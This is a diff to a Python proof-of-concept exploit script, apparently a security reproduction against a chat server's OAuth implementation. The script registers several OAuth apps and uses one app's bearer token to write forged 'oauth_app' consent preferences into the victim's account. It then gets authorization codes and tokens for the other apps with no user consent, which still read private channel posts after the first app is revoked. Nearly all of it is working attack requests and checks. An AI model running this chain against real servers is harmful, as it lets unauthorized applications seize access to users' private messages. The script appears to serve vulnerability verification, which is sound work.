@@ -94,7 +94,8 @@ def main():
 
     app_a=oauth_register()
     app_b=oauth_register()
-    verifier_a,pkce_a=challenge();verifier_b,pkce_b=challenge()
+    app_c=oauth_register()
+    verifier_a,pkce_a=challenge();verifier_b,pkce_b=challenge();verifier_c,pkce_c=challenge()
     st,out,h=browser_visit(app_b,pkce_b,normal_token)
     # Verify browser has NOT granted app B yet, and does not redirect to its callback.
     check("A03_unapproved_app_B_requires_consent",st==200 and h.get("Location") is None,
@@ -112,9 +113,14 @@ def main():
 
     st,_,_=request("POST","/oauth/authorize",grant_spec(app_b,pkce_b),token=access_a)
     check("A05_OAuth_A_cannot_directly_approve_B",st==403,st,403)
+    # The OAuth A session itself cannot auto-approve unconsented B via GET yet.
+    st,_,h=browser_visit(app_b,pkce_b,access_a)
+    check("A05B_OAuth_A_GET_B_no_automatic_grant_pre_injection",st==200 and not h.get("Location"),
+          {"status":st,"code_redirect":bool(h.get("Location"))},"200 consent page, no code")
 
     forged={"user_id":victim_id,"category":"oauth_app","name":app_b,"value":"user"}
-    st,_,_=request("PUT",f"/api/v4/users/{victim_id}/preferences",[forged],token=access_a)
+    forged_c={"user_id":victim_id,"category":"oauth_app","name":app_c,"value":"user"}
+    st,_,_=request("PUT",f"/api/v4/users/{victim_id}/preferences",[forged,forged_c],token=access_a)
     check("A06_OAuth_A_injects_B_authorization_preference",st==200,
           {"status":st,"authorization_preference_written":st==200},
           "200 preference written despite OAuth grant restriction")
@@ -128,6 +134,27 @@ def main():
        {"user_id":owner_id,"category":"oauth_app","name":app_b,"value":"user"}],token=access_a)
     check("A08_other_user_preference_denied",st in (403,404),st,"403/404")
 
+    # NO SECOND VICTIM VISIT: OAuth app A, acting through its own OAuth bearer session,
+    # now uses GET /oauth/authorize to cause auto-approval for client B.
+    # Direct POST was 403 (above); GET's saved-consent shortcut is the cross-feature bypass.
+    st,_,h=browser_visit(app_b,pkce_b,access_a)
+    location=h.get("Location","")
+    loc=urllib.parse.urlparse(location)
+    code_via_a=urllib.parse.parse_qs(loc.query).get("code",[""])[0]
+    check("A08B_OAuth_A_GET_B_silently_mints_authorization_code",
+          st in (302,303) and loc.netloc=="approved.example.invalid" and bool(code_via_a),
+          {"status":st,"callback_correct":loc.netloc=="approved.example.invalid",
+           "code_issued_to_B":bool(code_via_a)},
+          "OAuth bearer A gets code for B using GET, bypassing POST 403")
+    if not code_via_a:raise RuntimeError("No OAuth code B from application A alone")
+    st,issued_b,_=exchange(app_b,code_via_a,verifier_b)
+    token_b=issued_b.get("access_token","")
+    check("A08C_A_obtains_B_token_without_additional_user_action",
+          st==200 and bool(token_b),
+          {"status":st,"B_token_issued":bool(token_b)},
+          "A chains into B session without victim visiting B URL")
+    if not token_b:raise RuntimeError("A could not obtain OAuth B token")
+
     # User revokes exactly A through its legitimate OAuth deauthorization UI endpoint.
     st,_,_=request("POST","/oauth/deauthorize",{"client_id":app_a},token=normal_token)
     check("A09_victim_revokes_A_app",st==200,st,200)
@@ -135,33 +162,42 @@ def main():
     st,_,_=request("GET","/api/v4/users/me",token=access_a)
     check("A10_A_token_invalid_after_revocation",st==401,st,401)
 
-    # New browser visit: no approval click or POST for B; GET-only auto redirects
-    # because the forged consent preference survived revocation of A.
-    st,_,h=browser_visit(app_b,pkce_b,normal_token)
+    # Token B was acquired by OAuth A itself before A was revoked, with no
+    # victim browser interaction beyond A's original explicit OAuth grant.
+    st,posts,_=request("GET",f"/api/v4/channels/{cid}/posts",token=token_b)
+    check("A11_B_token_persists_after_A_revocation_without_victim_visit",
+          st==200 and canary in json.dumps(posts),
+          {"status":st,"private_canary_accessible":canary in json.dumps(posts)},
+          "B remains authorized after A is revoked; no victim B visit needed")
+
+    # Independent second client C: after A is revoked, victim's normal browser
+    # visits C's authorization URL and gets silently redirected without clicking consent.
+    st,_,h=browser_visit(app_c,pkce_c,normal_token)
     redirect=h.get("Location","")
     auth_uri=urllib.parse.urlparse(redirect)
-    code_b=urllib.parse.parse_qs(auth_uri.query).get("code",[""])[0]
-    check("A11_B_gets_code_without_user_B_approval_after_A_revoked",
-          st in (302,303) and auth_uri.netloc=="approved.example.invalid" and bool(code_b),
+    code_c=urllib.parse.parse_qs(auth_uri.query).get("code",[""])[0]
+    check("A12_C_gets_code_without_consent_after_A_revoked",
+          st in (302,303) and auth_uri.netloc=="approved.example.invalid" and bool(code_c),
           {"status":st,"callback_target_matched":auth_uri.netloc=="approved.example.invalid",
-           "new_authorization_code_issued":bool(code_b)},
-          "GET OAuth authorize silently issues B authorization code")
-    if not code_b:raise RuntimeError("No code B; no token exchange")
-    st,grant_b,_=exchange(app_b,code_b,verifier_b)
-    token_b=grant_b.get("access_token","")
-    check("A12_B_gets_new_OAuth_token_after_A_revocation",st==200 and bool(token_b),
-          {"status":st,"token_issued":bool(token_b)},
-          "200 OAuth B token without explicit B consent")
-    if not token_b:raise RuntimeError("No B token")
-    st,posts,_=request("GET",f"/api/v4/channels/{cid}/posts",token=token_b)
-    check("A13_B_reads_private_content_after_A_revocation",
+           "new_authorization_code_issued":bool(code_c)},
+          "GET OAuth authorize silently issues C authorization code")
+    if not code_c:raise RuntimeError("No code C; no token exchange")
+    st,grant_c,_=exchange(app_c,code_c,verifier_c)
+    token_c=grant_c.get("access_token","")
+    check("A13_C_gets_fresh_OAuth_token_after_A_revocation",
+          st==200 and bool(token_c),
+          {"status":st,"token_issued":bool(token_c)},
+          "200 OAuth C token without explicit C consent")
+    if not token_c:raise RuntimeError("No C token")
+    st,posts,_=request("GET",f"/api/v4/channels/{cid}/posts",token=token_c)
+    check("A14_C_reads_private_content_after_A_revocation",
           st==200 and canary in json.dumps(posts),
-          {"status":st,"private_canary_leaked_to_B":canary in json.dumps(posts)},
-          "B can read victim's private post using fresh token after A revoked")
+          {"status":st,"private_canary_accessible":canary in json.dumps(posts)},
+          "C can read user's private post using fresh token after A revoked")
     st,_,_=request("GET",f"/api/v4/channels/{cid}/posts",token=access_a)
-    check("A14_revoked_A_cannot_read_same_content",st==401,st,401)
+    check("A15_revoked_A_cannot_read_same_content",st==401,st,401)
     print("RESULTS "+json.dumps({
-       "chain":"DCR-A -> user consent A -> OAuth-A session -> Preferences(oauth_app=B) -> revoke A -> GET consent B auto-approved -> B token -> private channel read",
+       "chain":"DCR A/B/C -> victim grants A once -> A OAuth bearer writes B/C oauth_app preferences -> A GET /oauth/authorize B (POST denied 403) -> obtains B token without user B interaction -> victim revokes A -> A dead, B reads private posts -> C gets fresh post-revocation grant without consent",
        "failed":[r["test"] for r in RESULTS if not r["pass"]],"total":len(RESULTS)},sort_keys=True),flush=True)
     if any(not x["pass"] for x in RESULTS):sys.exit(2)
 if __name__=="__main__":
